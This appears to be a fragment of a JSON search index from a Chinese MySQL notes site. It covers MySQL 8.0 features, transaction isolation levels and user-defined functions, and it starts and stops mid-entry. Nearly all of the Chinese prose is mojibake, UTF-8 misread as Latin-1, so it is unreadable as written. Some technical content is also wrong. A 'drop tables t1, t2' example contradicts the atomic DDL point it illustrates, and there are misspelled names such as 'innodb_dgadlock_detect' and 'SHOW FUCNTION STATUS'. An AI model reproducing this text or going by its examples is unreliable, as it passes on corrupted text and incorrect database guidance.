åœ¨MySQLé‡å¯åï¼Œä¼šé‡ç½®AUTO_INCREMENT=maxï¼ˆprimary keyï¼‰+1ï¼Œ è¿™ç§ç°è±¡åœ¨æŸäº›æƒ…å†µä¸‹ä¼šå¯¼è‡´ä¸šåŠ¡ä¸»é”®å†²çªæˆ–è€…å…¶ä»–éš¾ä»¥å‘ç°çš„é—®é¢˜ã€‚ æ³¨è§£ é€šä¿—ç‚¹è¯´, mysqlä¸ä¼šè®°å½•å·²ç»è¢«åˆ é™¤çš„ä¸»é”®, æ¯”å¦‚æœ‰ç´¢å¼•å€¼: 1, 2, 3, 4, 5 åˆ é™¤äº†4å’Œ5, é‡å¯åæ–°å¢æ•°æ®, è‡ªå¢idä¼šä» 4 å¼€å§‹ è€Œä¸”å¦‚æœæ‰‹åŠ¨æŠŠ1, æ›´æ”¹ä¸ºå…¶ä»–çš„æ¯”å¦‚6, ä¸»é”®è‡ªå¢çš„å½“å‰æœ€å¤§å€¼ä¸ä¼šå˜, åé¢å†æ’å…¥çš„æ—¶å€™å°±å¯èƒ½æŠ¥é”™; Mysql8è§£å†³äº†è¿™ä¸ªé—®é¢˜, ä¼šè¯†åˆ«åˆ°æœ€å¤§è‡ªå¢idæ›´æ–° è‡ªå¢ä¸»é”®é‡å¯é‡ç½®çš„é—®é¢˜å¾ˆæ—©å°±è¢«å‘ç°ï¼ˆ https://bugs.mysql.com/bug.php?id=199 ï¼‰ï¼Œ ä¸€ç›´åˆ°8.0æ‰è¢«è§£æ±ºï¼Œ8.0ç‰ˆæœ¬å°†ä¼šå¯¹ AUTO_INCREMENT å€¼è¿›è¡ŒæŒä¹…åŒ–ï¼ŒMySQLé‡å¯åï¼Œè¯¥å€¼å°†ä¸ä¼šæ”¹å˜ã€‚ innodbå­˜å‚¨å¼•æ“select for updateè·³è¿¹é”ç­‰å¾… å¯¹äº select â€¦ for share ï¼ˆ8.0æ–°å¢åŠ æŸ¥è¯¢å…±äº«é”çš„è¯­æ³•ï¼‰æˆ– select â€¦ for update ï¼Œ åœ¨è¯­å¥åé¢æ·»åŠ  NOWAITã€ SKIP LOCKED è¯­æ³•å¯ä»¥è·³è¿‡é”ç­‰å¾…ï¼Œæˆ–è€…è·³è¿‡é”å®šã€‚ NOWAIT, æŠ¥é”™è¿”å› SKIP LOCKED, è¿”å›ç»“æœä¸åŒ…å«åŠ é”è¡Œ æ³¨è§£ select â€¦ for update è¡¨ç¤ºæŸ¥è¯¢çš„æ—¶å€™åŠ ä¸€ä¸ªæ’ä»–é” åœ¨5.7åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œselect.for updateï¼Œå¦‚æœè·å–ä¸åˆ°é”ï¼Œä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°innodb_lock_wait_timeoutè¶…æ—¶ã€‚ åœ¨8.0ç‰ˆæœ¬ï¼Œé€šè¿‡æ·»åŠ nowaitï¼Œskip lockedè¯­æ³•ï¼Œèƒ½å¤Ÿç«‹å³è¿”å›ã€‚ å¦‚æœæŸ¥è¯¢çš„è¡Œå·²ç»åŠ é”ï¼Œé‚£ä¹ˆnowaitä¼šç«‹å³æŠ¥é”™è¿”å›ï¼Œè€Œskip lockedä¹Ÿä¼šç«‹å³è¿”å›ï¼Œåªæ˜¯è¿”å›çš„ç»“æœä¸­ä¸åŒ…å«è¢«é”å®šçš„è¡Œã€‚ åº”ç”¨åœºæ™¯æ¯”å¦‚æŸ¥è¯¢ä½™ç¥¨è®°å½•ï¼Œå¦‚æœæŸäº›è®°å½•å·²ç»è¢«é”å®šï¼Œç”¨skip lockedå¯ä»¥è·³è¿‡è¢«é”å®šçš„è®°å½•ï¼Œåªè¿”å›æ²¡æœ‰é”å®šçš„è®°å½•ï¼Œæé«˜ç³»ç»Ÿæ€§èƒ½ã€‚ æ–°å¢innodb_dedicated_serverè‡ªé€‚åº”å‚æ•° èƒ½å¤Ÿè®©InnoDBæ ¹æ®æœåŠ¡å™¨ä¸Šæ£€æµ‹åˆ°çš„å†…å­˜å¤§å°è‡ªåŠ¨é…ç½®innodb_buffer_pool_size, innodb_log_file_sizeç­‰å‚æ•°ï¼Œ ä¼šå°½å¯èƒ½å¤šçš„å ç”¨ç³»ç»Ÿå¯å ç”¨èµ„æºæå‡æ€§èƒ½ã€‚ è§£å†³éä¸“ä¸šäººå‘˜å®‰è£…æ•°æ®åº“åé»˜è®¤åˆå§‹åŒ–æ•°æ®åº“å‚æ•°é»˜è®¤å€¼åä½çš„é—®é¢˜ï¼Œ å‰ææ˜¯æœåŠ¡å™¨æ˜¯ä¸“ç”¨æ¥ç»™MySQLæ•°æ®åº“çš„ï¼Œå¦‚æœè¿˜æœ‰å…¶ä»–è½¯ä»¶æˆ–è€…èµ„æºæˆ–è€…å¤šå®ä¾‹MySQLä½¿ç”¨ï¼Œä¸å»ºè®®å¼€å¯è¯¥å‚æ•°ï¼Œä¸ç„¶ä¼šå½±å“å…¶å®ƒç¨‹åºã€‚ é»˜è®¤æ˜¯OFFå…³é—­: show variables like '%innodb_dedicated_server%'; æ­»é”æ£€æŸ¥æ§åˆ¶ MySQL 8.0 ï¼ˆMySQL 5.7.15ï¼‰å¢åŠ äº†ä¸€ä¸ªæ–°çš„åŠ¨æ€å˜é‡ innodb_dgadlock_detectï¼Œ ç”¨äºæ§åˆ¶ç³»ç»Ÿæ˜¯å¦æ‰§è¡Œ InnoDBæ­»é”æ£€æŸ¥ï¼Œé»˜è®¤æ˜¯æ‰“å¼€çš„ã€‚ æ­»é”æ£€æµ‹ä¼šè€—è´¹æ•°æ®åº“æ€§èƒ½çš„ï¼Œå¯¹äºé«˜å¹¶å‘çš„ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥å…³é—­æ­»é”æ£€æµ‹åŠŸèƒ½ï¼Œæé«˜ç³»ç»Ÿæ€§èƒ½ã€‚ ä½†æ˜¯æˆ‘ä»¬è¦ç¡®ä¿ç³»ç»Ÿæå°‘æƒ…å†µä¼šå‘ç”Ÿæ­»é”ï¼ŒåŒæ—¶è¦å°†é”ç­‰å¾…è¶…æ—¶å‚æ•°è°ƒå°ä¸€ç‚¹ï¼Œä»¥é˜²å‡ºç°æ­»é”ç­‰å¾…è¿‡ä¹…çš„æƒ…å†µã€‚ é»˜è®¤æ‰“å¼€çš„: show variables like '%innodb_deadlock_detect%' undoæ–‡ä»¶ä¸å†ä½¿ç”¨ç³»ç»Ÿè¡¨ç©ºé—´ é»˜è®¤åˆ›å»º2ä¸ªUNDOè¡¨ç©ºé—´ï¼Œä¸å†ä½¿ç”¨ç³»ç»Ÿè¡¨ç©ºé—´ã€‚ binlogæ—¥å¿—è¿‡æœŸæ—¶é—´ç²¾ç¡®åˆ°ç§’ ä¹‹å‰æ˜¯å¤©ï¼Œå¹¶ä¸”å‚æ•°åç§°å‘ç”Ÿå˜åŒ–. åœ¨8.0ç‰ˆæœ¬ä¹‹å‰ï¼Œbinlogæ—¥å¿—è¿‡æœŸæ—¶é—´è®¾ç½®éƒ½æ˜¯è®¾ç½®expire_logs_dayså‚æ•°ï¼Œ è€Œåœ¨8.0ç‰ˆæœ¬ä¸­ï¼ŒMySQLé»˜è®¤ä½¿ç”¨binlog_expire_logs_secondså‚æ•°ã€‚ DDLåŸå­åŒ– InnoDBè¡¨çš„DDLæ–‡æŒäº‹åŠ¡å®Œæ•´æ€§ï¼Œè¦ä¹ˆæˆåŠŸè¦ä¹ˆå›æ»šã€‚ MySQL 8.0å¼€å§‹æ”¯æŒåŸå­DDLæ“ä½œï¼Œå…¶ä¸­ä¸è¡¨ç›¸å…³çš„åŸå­ DDLåªæ”¯æŒ InnoDB å­˜å‚¨å¼•æ“ã€‚ ä¸€ä¸ªåŸå­ DDL æ“ä½œå†…å®¹åŒ…æ‹¬ï¼šæ›´æ–°æ•°æ®å­—å…¸ï¼Œå­˜å‚¨å¼•æ“å±‚çš„æ“ä½œï¼Œåœ¨ binlog ä¸­è®°å½• DDL æ“ä½œã€‚ æ”¯æŒä¸è¡¨ç›¸å…³çš„DDLï¼šæ•°æ®åº“ã€è¡¨ç©ºé—´ã€è¡¨ã€ç´¢å¼•çš„ CREATEã€ALTERã€DROP ä»¥åŠ TRUNCATE TABLEã€‚ æ¯”å¦‚åˆ é™¤ä¸¤ä¸ªè¡¨, å³ä½¿t2æŠ¥é”™, t1ä¹Ÿä¼šè¢«æˆåŠŸåˆ é™¤: drop tables t1, t2; æ”¯æŒçš„å…¶å®ƒDDLï¼šå­˜å‚¨ç¨‹åºã€è§¦å‘å™¨ã€è§†å›¾ã€UDF çš„ CREATEã€DROP ä»¥åŠALTERè¯­å¥ã€‚ æ”¯æŒè´¦æˆ·ç®¡ç†ç›¸å…³çš„ DDLï¼šç”¨æˆ·å’Œè§’è‰²çš„ CREATEã€ALTERã€DROP ä»¥åŠé€‚ç”¨çš„ RENAMEç­‰ç­‰ã€‚ å‚æ•°ä¿®æ”¹æŒä¹…åŒ– MySQL 8.0ç‰ˆæœ¬æ”¯æŒåœ¨çº¿ä¿®æ”¹å…¨å±€å‚æ•°å¹¶æŒä¹…åŒ–ï¼Œé€šè¿‡åŠ ä¸ŠPERSISTå…³é”®å­—ï¼Œ å¯ä»¥å°†ä¿®æ”¹çš„å‚æ•°æŒä¹…åŒ–åˆ°æ–°çš„é…ç½®æ–‡ä»¶ï¼ˆmysqld-auto.cnfï¼‰ä¸­ï¼Œ é‡å¯MySQLæ—¶ï¼Œå¯ä»¥ä»è¯¥é…ç½®æ–‡ä»¶è·å–åˆ°æœ€æ–°çš„é…ç½®å‚æ•°ã€‚set global è®¾ç½®çš„å˜é‡å‚æ•°åœ¨mysqé‡å¯åä¼šå¤±æ•ˆã€‚ ç³»ç»Ÿä¼šåœ¨æ•°æ®ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªåŒ…å«jsonæ ¼å¼çš„mysqld-auto.cnf çš„æ–‡ä»¶, å½“my.cnf å’Œmysqld-auto.cnf åŒæ—¶å­˜åœ¨æ—¶ï¼Œåè€…å…·æœ‰æ›´é«˜ä¼˜å…ˆçº§: set persist innodb_lock_wait_timeout=25;","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-8.0-new-features.html","loc":"/yq-doc-source-docs-database-mysql-8.0-new-features.html"},{"title":"äº‹åŠ¡","text":"Mysqläº‹åŠ¡å››å¤§ç‰¹æ€§ACID A (Atomicity): åŸå­æ€§; äº‹åŠ¡ä½œä¸ºä¸€ä¸ªæ•´ä½“è¢«æ‰§è¡Œï¼ŒåŒ…å«åœ¨å…¶ä¸­çš„å¯¹æ•°æ®åº“çš„æ“ä½œè¦ä¹ˆå…¨éƒ¨è¢«æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œ; C (Consistency): ä¸€è‡´æ€§; æŒ‡åœ¨äº‹åŠ¡å¼€å§‹ä¹‹å‰å’Œäº‹åŠ¡ç»“æŸä»¥åï¼Œæ•°æ®ä¸ä¼šè¢«ç ´åï¼Œå‡å¦‚ A è´¦æˆ·ç»™B è´¦æˆ·è½¬ 10å—é’±ï¼Œä¸ç®¡æˆåŠŸä¸å¦ï¼ŒAå’ŒBçš„æ€»é‡‘é¢æ˜¯ä¸å˜çš„; I (Isolation): éš”ç¦»æ€§; å¤šä¸ªäº‹åŠ¡å¹¶å‘è®¿é—®æ—¶ï¼Œäº‹åŠ¡ä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œå³ä¸€ä¸ªäº‹åŠ¡ä¸å½±å“å…¶å®ƒäº‹åŠ¡è¿è¡Œæ•ˆæœ; D (Durability): æŒä¹…æ€§ è¡¨ç¤ºäº‹åŠ¡å®Œæˆä»¥åï¼Œè¯¥äº‹åŠ¡å¯¹æ•°æ®åº“æ‰€ä½œçš„æ“ä½œæ›´æ”¹ï¼Œå°†æŒä¹…åœ°ä¿å­˜åœ¨æ•°æ®åº“ä¹‹ä¸­. å®ç°åŸç† äº‹åŠ¡çš„éš”ç¦»æ€§æ˜¯é€šè¿‡æ•°æ®åº“é”ä»¥åŠMVCCæœºåˆ¶å®ç°çš„; äº‹åŠ¡çš„ä¸€è‡´æ€§ç”±undo logæ¥ä¿è¯ï¼š undo logæ˜¯é€»è¾‘æ—¥å¿—ï¼Œè®°å½•äº†äº‹åŠ¡çš„insertã€updateã€deleteæ“ä½œï¼Œ å›æ»šçš„æ—¶å€™åšç›¸åçš„deleteã€updateã€insertæ“ä½œæ¥æ¢å¤æ•°æ®ã€‚ äº‹åŠ¡çš„åŸå­æ€§å’ŒæŒä¹…æ€§ç”±redo logæ¥ä¿è¯ï¼š redo logè¢«ç§°ä½œé‡åšæ—¥å¿—ï¼Œæ˜¯ç‰©ç†æ—¥å¿—ï¼Œäº‹åŠ¡æäº¤çš„æ—¶å€™ï¼Œ å¿…é¡»å…ˆå°†äº‹åŠ¡çš„æ‰€æœ‰æ—¥å¿—å†™å…¥redo logæŒä¹…åŒ–ï¼Œåˆ°äº‹åŠ¡çš„æäº¤æ“ä½œæ‰ç®—å®Œæˆã€‚ äº‹åŠ¡éš”ç¦»çº§åˆ« è¯»æœªæäº¤ è¯»æœªæäº¤ï¼Œé‡‡å–çš„æ˜¯è¯»ä¸åŠ é”åŸç†ã€‚å…è®¸è„è¯» äº‹åŠ¡è¯»ä¸åŠ é”ï¼Œä¸é˜»å¡å…¶ä»–äº‹åŠ¡çš„è¯»å’Œå†™ äº‹åŠ¡å†™é˜»å¡å…¶ä»–äº‹åŠ¡å†™ï¼Œä½†ä¸é˜»å¡å…¶ä»–äº‹åŠ¡è¯»ï¼› è¯»æœªæäº¤éš”ç¦»çº§åˆ«ï¼Œåªé™åˆ¶äº†ä¸¤ä¸ªæ•°æ®ä¸èƒ½åŒæ—¶ä¿®æ”¹ï¼Œ ä½†æ˜¯ä¿®æ”¹æ•°æ®çš„æ—¶å€™ï¼Œå³ä½¿äº‹åŠ¡æœªæäº¤ï¼Œ éƒ½æ˜¯å¯ä»¥è¢«åˆ«çš„äº‹åŠ¡è¯»å–åˆ°çš„ï¼Œè¿™çº§åˆ«çš„äº‹åŠ¡éš”ç¦»æœ‰è„è¯»ã€é‡å¤è¯»ã€å¹»è¯»çš„é—®é¢˜ï¼› è¯»å·²æäº¤ è¯»å·²æäº¤éš”ç¦»çº§åˆ«ï¼Œå½“å‰äº‹åŠ¡åªèƒ½è¯»å–åˆ°å…¶ä»–äº‹åŠ¡æäº¤çš„æ•°æ®ï¼Œ æ‰€ä»¥è¿™ç§äº‹åŠ¡çš„éš”ç¦»çº§åˆ«è§£å†³äº†è„è¯»é—®é¢˜ï¼Œä½†è¿˜æ˜¯ä¼šå­˜åœ¨é‡å¤è¯»ã€å¹»è¯»é—®é¢˜ï¼› è¯»å–å·²æäº¤å’Œå¯é‡å¤è¯»çº§åˆ«åˆ©ç”¨äº†ReadViewå’ŒMVCCï¼Œ ä¹Ÿå°±æ˜¯æ¯ä¸ªäº‹åŠ¡åªèƒ½è¯»å–å®ƒèƒ½çœ‹åˆ°çš„ç‰ˆæœ¬ï¼ˆReadViewï¼‰ã€‚ åªèƒ½è¯»å–åˆ°å·²ç»æäº¤çš„æ•°æ®. READ COMMITTEDï¼šæ¯æ¬¡è¯»å–æ•°æ®å‰éƒ½ç”Ÿæˆä¸€ä¸ªReadView å¯é‡å¤è¯»(é»˜è®¤) å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ï¼Œé™åˆ¶äº†è¯»å–æ•°æ®çš„æ—¶å€™ï¼Œä¸å¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œ æ‰€ä»¥è§£å†³äº†é‡å¤è¯»çš„é—®é¢˜ï¼Œä½†æ˜¯è¯»å–èŒƒå›´æ•°æ®çš„æ—¶å€™ï¼Œæ˜¯å¯ä»¥æ’å…¥æ•°æ®ï¼Œæ‰€ä»¥è¿˜ä¼šå­˜åœ¨å¹»è¯»é—®é¢˜ï¼› å¯é‡å¤è¯». è¯»å–å·²æäº¤å’Œå¯é‡å¤è¯»çº§åˆ«åˆ©ç”¨äº†ReadViewå’ŒMVCCï¼Œ ä¹Ÿå°±æ˜¯æ¯ä¸ªäº‹åŠ¡åªèƒ½è¯»å–å®ƒèƒ½çœ‹åˆ°çš„ç‰ˆæœ¬ï¼ˆReadViewï¼‰ REPEATABLE READ ï¼šåœ¨äº‹åŠ¡é‡Œç¬¬ä¸€æ¬¡è¯»å–æ•°æ®æ—¶ç”Ÿæˆä¸€ä¸ªReadView ä¸²è¡ŒåŒ– äº‹åŠ¡æœ€é«˜çš„éš”ç¦»çº§åˆ«ï¼Œåœ¨è¯¥çº§åˆ«ä¸‹ï¼Œæ‰€æœ‰äº‹åŠ¡éƒ½æ˜¯è¿›è¡Œä¸²è¡ŒåŒ–é¡ºåºæ‰§è¡Œçš„ã€‚ å¯ä»¥é¿å…è„è¯»ã€ä¸å¯é‡å¤è¯»ä¸å¹»è¯»æ‰€æœ‰å¹¶å‘é—®é¢˜ã€‚ä½†æ˜¯è¿™ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ä¸‹ï¼Œäº‹åŠ¡æ‰§è¡Œå¾ˆè€—æ€§èƒ½ã€‚ ä¸²è¡ŒåŒ–çš„å®ç°é‡‡ç”¨çš„æ˜¯è¯»å†™éƒ½åŠ é”çš„åŸç†ã€‚ ä¸²è¡ŒåŒ–çš„æƒ…å†µä¸‹ï¼Œå¯¹äºåŒä¸€è¡Œäº‹åŠ¡ï¼Œå†™ä¼šåŠ å†™é”ï¼Œè¯»ä¼šåŠ è¯»é”ã€‚ å½“å‡ºç°è¯»å†™é”å†²çªçš„æ—¶å€™ï¼Œåè®¿é—®çš„äº‹åŠ¡å¿…é¡»ç­‰å‰ä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œå®Œæˆï¼Œæ‰èƒ½ç»§ç»­æ‰§è¡Œã€‚ æ•°æ®åº“æ˜¯å¦‚ä½•ä¿è¯äº‹åŠ¡çš„éš”ç¦»æ€§çš„å‘¢ï¼Ÿ æ•°æ®åº“æ˜¯é€šè¿‡åŠ é”ï¼Œæ¥å®ç°äº‹åŠ¡çš„éš”ç¦»æ€§çš„ã€‚ åŠ é”ç¡®å®å¥½ä½¿ï¼Œå¯ä»¥ä¿è¯éš”ç¦»æ€§ã€‚ æ¯”å¦‚ä¸²è¡ŒåŒ–éš”ç¦»çº§åˆ«å°±æ˜¯åŠ é”å®ç°çš„ã€‚ ä½†æ˜¯é¢‘ç¹çš„åŠ é”ï¼Œå¯¼è‡´è¯»æ•°æ®æ—¶ï¼Œæ²¡åŠæ³•ä¿®æ”¹ï¼Œä¿®æ”¹æ•°æ®æ—¶ï¼Œæ²¡åŠæ³•è¯»å–ï¼Œå¤§å¤§é™ä½äº†æ•°æ®åº“æ€§èƒ½ã€‚ é‚£ä¹ˆï¼Œå¦‚ä½•è§£å†³åŠ é”åçš„æ€§èƒ½é—®é¢˜çš„ï¼Ÿ ç­”æ¡ˆå°±æ˜¯,MVCCå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ å®ƒå®ç°è¯»å–æ•°æ®ä¸ç”¨åŠ é”ï¼Œå¯ä»¥è®©è¯»å–æ•°æ®åŒæ—¶ä¿®æ”¹ã€‚ä¿®æ”¹æ•°æ®æ—¶åŒæ—¶å¯è¯»å–ã€‚ å‚è§: /docs/æ•°æ®åº“/mysql/MVCC å‚è€ƒ: https://juejin.cn/post/7016165148020703246 å¹¶å‘å¸¦æ¥äº‹ç‰©é—®é¢˜ ä¸¢å¤±æ›´æ–° Aäº‹åŠ¡æäº¤æˆ–æ’¤é”€æ—¶, æŠŠBäº‹åŠ¡ç»™ä¸¢äº† è„è¯» å¦‚æœä¸€ä¸ªäº‹åŠ¡è¯»å–åˆ°äº†å¦ä¸€ä¸ªæœªæäº¤äº‹åŠ¡ä¿®æ”¹è¿‡çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±ç§°å‘ç”Ÿäº†è„è¯»ç°è±¡ã€‚ ä¸å¯é‡å¤è¯» åŒä¸€ä¸ªäº‹åŠ¡å†…ï¼Œå‰åå¤šæ¬¡è¯»å–ï¼Œè¯»å–åˆ°çš„æ•°æ®å†…å®¹ä¸ä¸€è‡´(å…¶ä»–äº‹åŠ¡çš„ä¿®æ”¹å·²ç»æäº¤) å¹»è¯» å¦‚æœä¸€ä¸ªäº‹åŠ¡å…ˆæ ¹æ®æŸäº›æœç´¢æ¡ä»¶æŸ¥è¯¢å‡ºä¸€äº›è®°å½•ï¼Œ åœ¨è¯¥äº‹åŠ¡æœªæäº¤æ—¶ï¼Œ å¦ä¸€ä¸ªäº‹åŠ¡å†™å…¥äº†ä¸€äº›ç¬¦åˆé‚£äº›æœç´¢æ¡ä»¶çš„è®°å½•ï¼ˆå¦‚insertã€deleteã€updateï¼‰ï¼Œå°±æ„å‘³ç€å‘ç”Ÿäº†å¹»è¯»ã€‚ äº‹åŠ¡ä¼˜åŒ– ä¼˜åŒ–åŸåˆ™ åœ¨ä¿è¯ä¸šåŠ¡é€»è¾‘çš„å‰æä¸‹, å°½é‡ç¼©çŸ­äº‹åŠ¡é•¿åº¦ å¤§äº‹åŠ¡æ‹†åˆ†ä¸ºå°äº‹åŠ¡ DDLæ‹†åˆ†(æ— é”å˜æ›´) é•¿äº‹åŠ¡åˆå¹¶ä¸ºå¤§äº‹åŠ¡ é•¿äº‹åŠ¡åˆ†è§£(ä¸å¿…è¦çš„è¯·æ±‚æ“¦é™¤) åº”ç”¨ä¿æŒä¸€è‡´æ€§","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Affairs.html","loc":"/yq-doc-source-docs-database-mysql-Affairs.html"},{"title":"è‡ªå®šä¹‰å‡½æ•°","text":"å¯èƒ½ä¼šé‡åˆ°å†…ç½®å‡½æ•° /docs/æ•°æ®åº“/mysql/æ¦‚å¿µåŸºç¡€/å‡½æ•°API æ»¡è¶³ä¸äº†ä½¿ç”¨åœºæ™¯çš„é—®é¢˜, è¿™æ—¶å€™è‡ªå®šä¹‰å‡½æ•°å°±æœ‰ç”¨äº† è‡ªå®šä¹‰å‡½æ•°æ˜¯ä¸€ç§ä¸å­˜å‚¨è¿‡ç¨‹ååˆ†ç›¸ä¼¼çš„è¿‡ç¨‹å¼æ•°æ®åº“å¯¹è±¡ã€‚ å®ƒä¸å­˜å‚¨è¿‡ç¨‹ä¸€æ ·ï¼Œéƒ½æ˜¯ç”± SQL è¯­å¥å’Œè¿‡ç¨‹å¼è¯­å¥ç»„æˆçš„ä»£ç ç‰‡æ®µï¼Œå¹¶ä¸”å¯ä»¥è¢«åº”ç”¨ç¨‹åºå’Œå…¶ä»– SQL è¯­å¥è°ƒç”¨ã€‚ è‡ªå®šä¹‰å‡½æ•°ä¸å­˜å‚¨è¿‡ç¨‹ä¹‹é—´å­˜åœ¨å‡ ç‚¹åŒºåˆ«ï¼š è‡ªå®šä¹‰å‡½æ•°ä¸èƒ½æ‹¥æœ‰è¾“å‡ºå‚æ•°ï¼Œè¿™æ˜¯å› ä¸ºè‡ªå®šä¹‰å‡½æ•°è‡ªèº«å°±æ˜¯è¾“å‡ºå‚æ•°ï¼›è€Œå­˜å‚¨è¿‡ç¨‹å¯ä»¥æ‹¥æœ‰è¾“å‡ºå‚æ•°ã€‚ è‡ªå®šä¹‰å‡½æ•°ä¸­å¿…é¡»åŒ…å«ä¸€æ¡ RETURN è¯­å¥ï¼Œè€Œè¿™æ¡ç‰¹æ®Šçš„ SQL è¯­å¥ä¸å…è®¸åŒ…å«äºå­˜å‚¨è¿‡ç¨‹ä¸­ã€‚ å¯ä»¥ç›´æ¥å¯¹è‡ªå®šä¹‰å‡½æ•°è¿›è¡Œè°ƒç”¨è€Œä¸éœ€è¦ä½¿ç”¨ CALL è¯­å¥ï¼Œè€Œå¯¹å­˜å‚¨è¿‡ç¨‹çš„è°ƒç”¨éœ€è¦ä½¿ç”¨ CALL è¯­å¥ã€‚ åˆ›å»º è¯­æ³•: CREATE FUNCTION <å‡½æ•°å> ( [ <å‚æ•°1> <ç±»å‹1> [ , <å‚æ•°2> <ç±»å‹2>] ] â€¦ ) RETURNS <ç±»å‹> <å‡½æ•°ä¸»ä½“> å‡½æ•°å: åº”è¯¥åˆæ³•çš„æ ‡è¯†ç¬¦ï¼Œå¹¶ä¸”ä¸åº”è¯¥ä¸å·²æœ‰çš„å…³é”®å­—å†²çª, åŒ…æ‹¬å·²æœ‰å‡½æ•°å, å·²æœ‰å­˜å‚¨è¿‡ç¨‹åç§° ä¸€ä¸ªå‡½æ•°åº”è¯¥å±äºæŸæ•°æ®åº“ï¼Œå¯ä»¥ä½¿ç”¨ db_name.funciton_name çš„å½¢å¼æ‰§è¡Œå½“å‰å‡½æ•°æ‰€å±æ•°æ®åº“, å¦åˆ™é»˜è®¤ä¸ºå½“å‰æ•°æ®åº“ã€‚ å‚æ•°åˆ—è¡¨: å¯ä»¥æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ªå‡½æ•°å‚æ•°ï¼Œç”šè‡³æ˜¯æ²¡æœ‰å‚æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚å¯¹äºæ¯ä¸ªå‚æ•°ï¼Œç”±å‚æ•°åå’Œå‚æ•°ç±»å‹ç»„æˆã€‚ è¿”å›å€¼: æŒ‡æ˜è¿”å›å€¼ç±»ç±»å‹ å‡½æ•°ä½“: è‡ªå®šä¹‰å‡½æ•°çš„å‡½æ•°ä½“ç”±å¤šæ¡å¯ç”¨çš„MySQLè¯­å¥ï¼Œæµç¨‹æ§åˆ¶ï¼Œå˜é‡å£°æ˜ç­‰è¯­å¥æ„æˆã€‚ éœ€è¦æŒ‡æ˜çš„æ˜¯å‡½æ•°ä½“ä¸­ä¸€å®šè¦å«æœ‰return è¿”å›è¯­å¥ã€‚ æ³¨è§£ åˆ›å»ºå‡½æ•°æ—¶, è‹¥ä¸æŒ‡å®šåº“å, ä¼šåˆ›å»ºåœ¨å½“å‰åº“, ä½¿ç”¨æ—¶ä¹Ÿæ˜¯ ç¤ºä¾‹-æ— å‚å‡½æ•°: mysql> DROP FUNCTION IF EXISTS hello; Query OK, 0 rows affected, 1 warning (0.00 sec) mysql> DELIMITER $$ mysql> CREATE FUNCTION hello() -> RETURNS VARCHAR(255) -> BEGIN -> RETURN 'Hello world,i am mysql'; -> END $$ Query OK, 0 rows affected (0.11 sec) mysql> DELIMITER ; mysql> SELECT hello(); +-------------------------+ | hello() | +-------------------------+ | Hello world,i am mysql | +-------------------------+ 1 row in set (0.00 sec) ç¤ºä¾‹-å«æœ‰å‚æ•°çš„è‡ªå®šä¹‰å‡½æ•°: mysql> DELIMITER $$ mysql> DROP FUNCTION IF EXISTS test.formatDate $$ Query OK, 0 rows affected, 1 warning (0.07 sec) mysql> CREATE FUNCTION test.formatDate(fdate datetime) -> RETURNS VARCHAR(255) -> BEGIN -> DECLARE x VARCHAR(255) DEFAULT ''; -> SET x= date_format(fdate,'%Yå¹´%mæœˆ%dæ—¥%hæ—¶%iåˆ†%sç§’'); -> RETURN x; -> END $$ Query OK, 0 rows affected (0.11 sec) mysql> DELIMITER ; mysql> SELECT formatDate(now()); +----------------------------+ | formatDate(now()) | +----------------------------+ | 2014å¹´11æœˆ21æ—¥03æ—¶41åˆ†21ç§’ | +----------------------------+ 1 row in set (0.18 sec) æŸ¥è¯¢è‡ªå®šä¹‰å‡½æ•° æŸ¥çœ‹æ•°æ®åº“ä¸­å­˜åœ¨å“ªäº›è‡ªå®šä¹‰å‡½æ•°: SHOW FUNCTION STATUS è‹¥è¦æŸ¥çœ‹æ•°æ®åº“ä¸­æŸä¸ªå…·ä½“çš„è‡ªå®šä¹‰å‡½æ•°: SHOW CREATE FUNCTION<å‡½æ•°å> æŸ¥çœ‹å‡½æ•°çŠ¶æ€, æ¯”å¦‚åˆ›å»ºæ—¶é—´ä¹‹ç±»: SHOW FUCNTION STATUS LIKE 'å‡½æ•°å' å…¶ä¸­<å‡½æ•°å>ç”¨äºæŒ‡å®šè¯¥è‡ªå®šä¹‰å‡½æ•°çš„åç§°ã€‚ ä¿®æ”¹è‡ªå®šä¹‰å‡½æ•° ä¿®æ”¹å‡½æ•°ç›¸å…³ç‰¹å¾: ALTER FUNCTION func_name [characteristic ...] characteristic: COMMENT 'string' | LANGUAGE SQL | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA } | SQL SECURITY { DEFINER | INVOKER } ä¸Šé¢è¿™ä¸ªè¯­æ³•ç»“æ„æ˜¯MySQLå®˜æ–¹ç»™å‡ºçš„ï¼Œä¿®æ”¹çš„å†…å®¹å¯ä»¥åŒ…å«SQLè¯­å¥ä¹Ÿå¯ä»¥ä¸åŒ…å«ï¼Œ æ—¢å¯ä»¥æ˜¯è¯»æ•°æ®çš„SQLä¹Ÿå¯ä»¥æ˜¯ä¿®æ”¹æ•°æ®çš„SQLè¿˜æœ‰æƒé™ã€‚ æ­¤å¤–åœ¨ä¿®æ”¹functionçš„æ—¶å€™è¿˜éœ€è¦æ³¨æ„ä½ ä¸èƒ½ä½¿ç”¨è¿™ä¸ªè¯­å¥æ¥ä¿®æ”¹å‡½æ•°çš„å‚æ•°ä»¥åŠå‡½æ•°ä½“ï¼Œ å¦‚æœä½ æƒ³æ”¹å˜è¿™äº›çš„è¯ä½ å°±éœ€è¦åˆ é™¤æ‰è¿™ä¸ªå‡½æ•°ç„¶åé‡æ–°åˆ›å»ºã€‚ ä¾‹å­: mysql> SELECT hello(); +-------------------------+ | hello() | +-------------------------+ | Hello world,i am mysql | +-------------------------+ 1 row in set (0.00 sec) mysql> ALTER FUNCTION hello -> -> READS SQL DATA -> COMMENT 'print 